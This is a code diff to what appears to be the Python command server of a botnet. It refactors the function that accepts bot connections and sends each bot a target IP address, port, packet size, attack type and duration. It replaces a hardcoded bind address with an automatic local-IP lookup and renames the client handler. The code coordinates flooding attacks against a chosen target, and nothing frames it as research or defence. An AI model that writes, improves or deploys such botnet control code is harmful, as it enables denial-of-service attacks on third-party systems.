@@ -66,9 +66,7 @@ def send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration)
 
 
 def botnet(ipAddress, portNumber, packetSize, attackType, duration):
-    # hostname=socket.gethostname()   
-    # bindIp=socket.gethostbyname(hostname)   
-    bindIp="192.168.6.22"
+    bindIp = getIpAddress()
     bindPort = 1046
     servAdd = (bindIp, bindPort)
     
@@ -88,7 +86,7 @@ def botnet(ipAddress, portNumber, packetSize, attackType, duration):
         conn, addr = server.accept() # accept the connection
         
         # Create a new thread to handle the connection
-        client_thread = threading.Thread(target=handle_client, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
+        client_thread = threading.Thread(target=handleClient, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
         client_thread.start()
         
         threads.append(client_thread) # Store the thread in the list
@@ -98,8 +96,15 @@ def botnet(ipAddress, portNumber, packetSize, attackType, duration):
         thread.join()
 
 
-def handle_client(conn, addr, ipAddress, portNumber, packetSize, attackType, duration):
+def handleClient(conn, addr, ipAddress, portNumber, packetSize, attackType, duration):
     # Handle the connection
     print('accepted connection from {} and port {}'.format(addr[0], addr[1]))
     send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration)
     conn.close()
+
+def getIpAddress():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
